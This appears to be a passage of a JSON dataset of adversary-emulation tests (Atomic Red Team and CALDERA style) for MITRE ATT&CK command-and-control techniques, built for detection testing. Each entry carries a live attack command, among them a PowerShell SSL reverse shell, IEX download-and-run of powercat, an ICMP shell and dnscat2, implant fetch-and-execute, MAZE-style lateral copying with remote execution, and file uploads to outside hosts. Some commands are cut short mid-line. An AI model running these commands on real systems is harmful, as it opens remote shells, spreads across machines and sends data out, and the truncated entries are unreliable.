         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n",
         "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"; Start-Process -Wait $file1 /quiet; Start-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\""
      },
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n",
         "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"; Start-Process -Wait $file1 /S; Start-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'"
      }
   ],
   "T1105": [
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Use nimgrab.exe to download a file from the web. \n",
         "command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\\Atomic-license.txt"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Utilize scp to perform a remote file copy (push)\n",
         "command": "scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n",
         "command": "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n",
         "command": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Utilize scp to perform a remote file copy (pull)\n",
         "command": "scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
         "command": "del %TEMP%\\redcanary.cab >nul 2>&1 && C:\\Windows\\System32\\replace.exe \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab %TEMP% /A"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
         "command": "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Create a ZIP file from a folder in a remote drive\n",
         "command": "del %TEMP%\\PrintBrm.zip >nul 2>&1  && C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\  -f %TEMP%\\PrintBrm.zip -O FORCE"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Utilize sftp to perform a remote file copy (push)\n",
         "command": "sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Utilize rsync to perform a remote file copy (pull)\n",
         "command": "rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Use 'iwr' or \"Invoke-WebRequest\" -URI argument to download a file from the web. Note: without -URI also works in some versions.\n",
         "command": "powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Utilize rsync to perform a remote file copy (push)\n",
         "command": "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n",
         "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe && C:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n",
         "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
         "command": "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n",
         "command": "curl -sO"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n",
         "command": "finger base64_filedata@localhost"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Utilize sftp to perform a remote file copy (pull)\n",
         "command": "sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
         "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"; New-Item -Path $datePath -ItemType Directory; Set-Location $datePath; certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt; Get-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
         "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"; & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Use certreq to download a file from the web",
         "command": "certreq.exe -Post -config https://example.com c:\\windows\\win.ini %temp%\\Atomic-license.txt"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n",
         "command": "pushd \\\\localhost\\C$ && echo var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js && CScript.exe AtomicTestT1105.js //E:JScript && del AtomicTestT1105.js /Q >nul 2>&1 && del AtomicTestFileT1105.js /Q >nul 2>&1 && popd"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n",
         "command": "C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n",
         "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\" && MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\\Atomic-license.txt"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
         "command": "del %TEMP%\\redcanary.cab >nul 2>&1 && C:\\Windows\\System32\\replace.exe \"682a17_redcanary.cab\" %TEMP% /A"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Use wscript to run a local VisualBasic file to download a remote file",
         "command": "wscript.exe \"bf591b_T1105-download-file.vbs\""
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n",
         "command": "\"821ca9_T1105.bat\" 1>NUL"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n",
         "command": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"; $offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"; $completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"; foreach ($machine in get-content -path \"$machine_list\"); {if (test-connection -Count 1 -computername $machine -quiet) ; {cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"; echo $machine >> \"$completed_list\"; wmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}; else; {echo $machine >> \"$offline_list\"}}"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Download a remote file using the whois utility\n",
         "command": "timeout --preserve-status 1 whois -h localhost -p 8443 \"Hello from Atomic Red Team test T1105\" > /tmp/T1105.whois.out"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "A reverse-shell agent which communicates via the TCP contact",
         "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -http $server -socket $socket -contact $contact -v\n"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.",
         "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -v\n"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Download, install and start new process under PowerShell Core 6",
         "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;\n"
      },
      {
         "technique_id": "T1105",
         "technique_name": "Ingress Tool Transfer",
         "tactic": "command-and-control",
         "description": "Download and install PSTools by unzipping the file",
         "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"
      }
   ],
   "T1573": [
      {
         "technique_id": "T1573",
         "technique_name": "Encrypted Channel",
         "tactic": "command-and-control",
         "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
         "command": "$server_ip =; $server_port =; $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}'); $stream = $socket.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])); $sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false); $writer = new-object System.IO.StreamWriter($sslStream); $writer.Write('PS ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0); {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data | Out-String ) 2>&1; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}"
      }
   ],
   "T1572": [
      {
         "technique_id": "T1572",
         "technique_name": "Protocol Tunneling",
         "tactic": "command-and-control",
         "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
         "command": "Set-Location \"C:\\Users\\puma-4\\Desktop\"; C:\\Users\\puma-4\\Desktop\\T1572-doh-domain-length.ps1 -DohServer \"https://8.8.8.8/resolve\""
      },
      {
         "technique_id": "T1572",
         "technique_name": "Protocol Tunneling",
         "tactic": "command-and-control",
         "description": "Download and run ngrok. Create tunnel to chosen port.\n",
         "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | Out-Null; Start-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null; Start-Sleep -s 5 ; Stop-Job -Name Job1 | Out-Null"
      },
      {
         "technique_id": "T1572",
         "technique_name": "Protocol Tunneling",
         "tactic": "command-and-control",
         "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
         "command": "Set-Location \"C:\\Users\\puma-4\\Desktop\"; C:\\Users\\puma-4\\Desktop\\T1572-doh-beacon.ps1 -DohServer \"https://8.8.8.8/resolve\""
      },
      {
         "technique_id": "T1572",
         "technique_name": "Protocol Tunneling",
         "tactic": "command-and-control",
         "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
         "command": "for($i=0; $i -le"
      }
   ],
   "T1132.001": [
      {
         "technique_id": "T1132.001",
         "technique_name": "Data Encoding: Standard Encoding",
         "tactic": "command-and-control",
         "description": "Utilizing a common technique for posting base64 encoded data.\n",
         "command": "echo -n 111-11-1111 | base64; curl -XPOST MTExLTExLTExMTE=.redcanary.com"
      },
      {
         "technique_id": "T1132.001",
         "technique_name": "Data Encoding: Standard Encoding",
         "tactic": "command-and-control",
         "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n",
         "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\")); $key = \"abcdefghijklmnopqrstuvwxyz123456\"; $cyphertext =  @(); for ($i = 0; $i -lt $plaintext.Count; $i++) {;  $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; }; $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext); [System.Net.ServicePointManager]::Expect100Continue = $false; Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive"
      }
   ],
   "T1571": [
      {
         "technique_id": "T1571",
         "technique_name": "Non-Standard Port",
         "tactic": "command-and-control",
         "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n",
         "command": "Test-NetConnection -ComputerName google.com -port 8081"
      },
      {
         "technique_id": "T1571",
         "technique_name": "Non-Standard Port",
         "tactic": "command-and-control",
         "description": "Testing uncommonly used port utilizing telnet.\n",
         "command": "echo quit | telnet google.com 8081; exit 0"
      }
   ],
   "T1090.003": [
      {
         "technique_id": "T1090.003",
         "technique_name": "Proxy: Multi-hop Proxy",
         "tactic": "command-and-control",
         "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
         "command": "if [ -x \"$(command -v tor --version)\" ]; then : ; else sudo apt-get -y install tor; fi;  ;  sudo systemctl start tor"
      },
      {
         "technique_id": "T1090.003",
         "technique_name": "Proxy: Multi-hop Proxy",
         "tactic": "command-and-control",
         "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n",
         "command": "invoke-expression 'cmd /c start powershell -Command {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe\"}'; sleep -s 60; stop-process -name \"tor\" | out-null"
      },
      {
         "technique_id": "T1090.003",
         "technique_name": "Proxy: Multi-hop Proxy",
         "tactic": "command-and-control",
         "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n",
         "command": "& \"C:\\Users\\puma-4\\Desktop\\Psiphon.bat\""
      },
      {
         "technique_id": "T1090.003",
         "technique_name": "Proxy: Multi-hop Proxy",
         "tactic": "command-and-control",
         "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
         "command": "if [ -x \"$(command -v tor --version)\" ]; then : ; else if [ ! -x \"$(command -v brew --version)\" ]; then /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)\"; fi; brew install tor; fi;  ;  osascript -e 'tell application \"Terminal\" to do script \"tor\"'"
      }
   ],
   "T1095": [
      {
         "technique_id": "T1095",
         "technique_name": "Non-Application Layer Protocol",
         "tactic": "command-and-control",
         "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
         "command": "cmd /c \"#{ncat_exe}\""
      },
      {
         "technique_id": "T1095",
         "technique_name": "Non-Application Layer Protocol",
         "tactic": "command-and-control",
         "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
         "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1'); powercat -c"
      },
      {
         "technique_id": "T1095",
         "technique_name": "Non-Application Layer Protocol",
         "tactic": "command-and-control",
         "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n",
         "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress"
      }
   ],
   "T1071.004": [
      {
         "technique_id": "T1071.004",
         "technique_name": "Application Layer Protocol: DNS",
         "tactic": "command-and-control",
         "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
         "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); Start-Dnscat2 -Domain"
      },
      {
         "technique_id": "T1071.004",
         "technique_name": "Application Layer Protocol: DNS",
         "tactic": "command-and-control",
         "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n",
         "command": "Set-Location \"C:\\Users\\puma-4\\Desktop\"; C:\\Users\\puma-4\\Desktop\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT"
      },
      {
         "technique_id": "T1071.004",
         "technique_name": "Application Layer Protocol: DNS",
         "tactic": "command-and-control",
         "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
         "command": "for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \"TXT\" \"atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io\" -QuickTimeout}"
      },
      {
         "technique_id": "T1071.004",
         "technique_name": "Application Layer Protocol: DNS",
         "tactic": "command-and-control",
         "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
         "command": "Set-Location \"C:\\Users\\puma-4\\Desktop\"; C:\\Users\\puma-4\\Desktop\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30"
      }
   ],
   "T1090.001": [
      {
         "technique_id": "T1090.001",
         "technique_name": "Proxy: Internal Proxy",
         "tactic": "command-and-control",
         "description": "Enable traffic redirection on macOS UI (not terminal).\nThe test will modify and enable the \"Web Proxy\" and \"Secure Web Proxy\" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.\n\nNote that this test may conflict with pre-existing system configuration.\n",
         "command": "networksetup -setwebproxy; networksetup -setsecurewebproxy"
      },
      {
         "technique_id": "T1090.001",
         "technique_name": "Proxy: Internal Proxy",
         "tactic": "command-and-control",
         "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n",
         "command": "export"
      },
      {
         "technique_id": "T1090.001",
         "technique_name": "Proxy: Internal Proxy",
         "tactic": "command-and-control",
         "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n",
         "command": "netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1"
      }
   ],
   "T1071.001": [
      {
         "technique_id": "T1071.001",
         "technique_name": "Application Layer Protocol: Web Protocols",
         "tactic": "command-and-control",
         "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
